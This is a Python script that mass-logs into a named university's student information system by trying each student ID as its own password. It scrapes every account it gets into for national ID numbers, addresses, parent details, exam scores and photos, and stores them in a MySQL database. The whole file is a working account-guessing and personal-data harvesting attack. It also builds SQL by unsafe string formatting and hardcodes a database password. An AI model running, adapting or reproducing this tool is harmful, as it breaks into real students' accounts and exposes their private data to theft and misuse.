#-*- coding:utf-8 -*-
__author__ = "Leo Luo"

import requests
from bs4 import BeautifulSoup
import collections
import lxml
import os
import sys
import pymysql

BASE_URP_URL = "http://bksjw.chd.edu.cn"
LOGIN_URL = "http://bksjw.chd.edu.cn/loginAction.do"
HEAD = {'User-Agent':'Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0','Connection': 'Keep-Alive'}
IMG_URL = "http://bksjw.chd.edu.cn/xjInfoAction.do?oper=img" #头像的URL
USER_INFO_URL = "http://bksjw.chd.edu.cn/xjInfoAction.do?oper=xjxx"
GRADE = "http://bksjw.chd.edu.cn/bxqcjcxAction.do"
"""
proxies_dict = {}
proxy_url = "http://api.xicidaili.com/free2016.txt"
r = requests.get(proxy_url)
proxies = (r.text).split()
app = "http://"
for proxy in proxies:
    app += proxy
proxies_dict['http'] = proxies
proxy_ = {"http": "http://120.76.243.40"}
"""
class NotValidIdException(Exception):
    pass

def login(username):
    result = []
    session = requests.Session()
    base_page = session.get(BASE_URP_URL, headers=HEAD)#, proxies=proxy_)
    """
    if base_page.status_code == 200:
        print("Connection OK! ")
    """
    data = {'zjh':username,'mm':username,'dllx':'dldl'}
    index = session.post(LOGIN_URL,data=data, headers=HEAD)
    """
    if index.status_code == 200:
        print("Login success. ")
    """
    image = session.get(IMG_URL)
    img_content = image.content
    user_info_index = session.get(USER_INFO_URL,headers=HEAD)
    soup = user_info_index.text#content.decode('utf-8')
    result.append(soup)
    result.append(img_content)
    return result
def parse(soup):
    soup = BeautifulSoup(soup, 'lxml')
    id_num = soup.find_all('td', attrs={'width':'275'})
    user_info_list = []
    for i in id_num:
        user_info_list.append(i.string.strip())
    user_info = collections.OrderedDict()
    try:
        user_info['学号'] = user_info_list[0]
        user_info['姓名'] = user_info_list[1]
        user_info['姓名拼音'] = user_info_list[2]
        user_info['英文姓名'] = user_info_list[3]
        user_info['曾用名'] = user_info_list[4]
        user_info['身份证号'] = user_info_list[5]
        user_info['性别'] = user_info_list[6]
        user_info['学生类型'] = user_info_list[7]
        user_info['特殊学生类型'] = user_info_list[8]
        user_info['学籍状态'] = user_info_list[9]
        user_info['收费类型'] = user_info_list[10]
        user_info['民族'] = user_info_list[11]
        user_info['籍贯'] = user_info_list[12]
        user_info['出生日期'] = user_info_list[13]
        user_info['政治面貌'] = user_info_list[14]
        user_info['考区'] = user_info_list[15]
        user_info['毕业中学'] = user_info_list[16]
        user_info['高考总分'] = user_info_list[17]
        user_info['录取号'] = user_info_list[18]
        user_info['高考考生号'] = user_info_list[19]
        user_info['入学考试语种'] = user_info_list[20]
        user_info['通讯地址'] = user_info_list[21]
        user_info['邮箱'] = user_info_list[22]
        user_info['家长信息'] = user_info_list[23]
        user_info['入学日期'] = user_info_list[24]
        user_info['系所'] = user_info_list[25]
        user_info['专业'] = user_info_list[26]
        user_info['专业方向'] = user_info_list[27]
        user_info['年级'] = user_info_list[28]
        user_info['班级'] = user_info_list[29]
        user_info['是否有学籍'] = user_info_list[30]
        user_info['是否有国家学籍'] = user_info_list[31]
        user_info['校区'] = user_info_list[32]
        user_info['异动否'] = user_info_list[33]
        user_info['外语语种'] = user_info_list[34]
        user_info['宿舍地址'] = user_info_list[35]
        user_info['因材施教'] = user_info_list[36]
        user_info['培养层级'] = user_info_list[37]
        user_info['培养方式'] = user_info_list[38]
        user_info['分流方向'] = user_info_list[39]
        user_info['是否离校'] = user_info_list[40]
        user_info['备注'] = user_info_list[41]
        user_info['备注1'] = user_info_list[42]
        user_info['备注2'] = user_info_list[43]
        user_info['备注3'] = user_info_list[44]
    except IndexError as err:
        print("用户不存在!")
        return 0
    return user_info

def gen_id():
    """This is for 2011-2015
    ***Which is 12 bit
    """
    #Before 2011 is 10 bit
    with open("2013.txt", "r") as fh:
        for line in fh:
            after = ""
            after = line.replace("2013", "2015")
            after = after.replace("\n", "")
            yield after

def main():
    ids = gen_id()
    conn = pymysql.connect(host="127.0.0.1", port=3306, user="leo", password="mm123456", db="chd", charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor )
    cur = conn.cursor()
    while True:
        origin = ids.__next__()
        try:
            result = login(origin)
        except TypeError:#, NotValidIdException):
            print(origin, type(origin), len(origin))
            return
        img = result[1]
        user_info = parse(result[0])
        if user_info == 0:
            continue
        else:
            print(user_info['姓名'], "已被找到")
        os.chdir("e:")
        """
        if len(img) == 0:
            print(user_info['姓名'], "无头像")
        """
        if img is not None and len(img) != 0:
            with open("Students/" + user_info['姓名'] + user_info['学号'] + ".png", 'wb') as fh:
                fh.write(img)
        keys = ""
        values = ""
        for key, value in user_info.items():
            key += ", "
            keys += key
            value = "\'" + value
            value += "\'"
            value += ", "
            values += value
        try:
            cur.execute('INSERT INTO students ({0}) VALUES ({1})'.format(keys.rstrip(", "), values.rstrip(", ")))
        except pymysql.err.IntegrityError as err:
            print("已存在")
        except pymysql.err.DataError as err:
            print(err)
        cur.connection.commit()
    cur.close()
    conn.close()

if __name__ == "__main__":
    main()
